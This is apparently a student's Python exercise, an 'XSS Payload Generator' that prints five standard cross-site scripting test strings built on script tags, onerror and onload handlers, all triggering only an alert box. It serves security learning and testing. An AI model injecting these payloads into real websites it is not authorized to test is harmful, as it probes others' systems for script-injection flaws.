
# student_name: Dharshana

# roll_number: 727823TUCY009

# project_name: XSS Payload Generator

# date: 2026-03-29

import datetime

def generate_payloads():
    payloads = [
"<script>alert('XSS')</script>",
"<img src=x onerror=alert('XSS')>",
"<svg onload=alert('XSS')>",
"'><script>alert(1)</script>",
"<body onload=alert('XSS')>"
]
    return payloads

def main():
     print("Roll No: 727823TUCY009")
     print("Timestamp:", datetime.datetime.now())

payloads = generate_payloads()

print("\nGenerated Payloads:")
for i, payload in enumerate(payloads):
    print(f"{i+1}. {payload}")


if __name__ == "__main__":
    main()

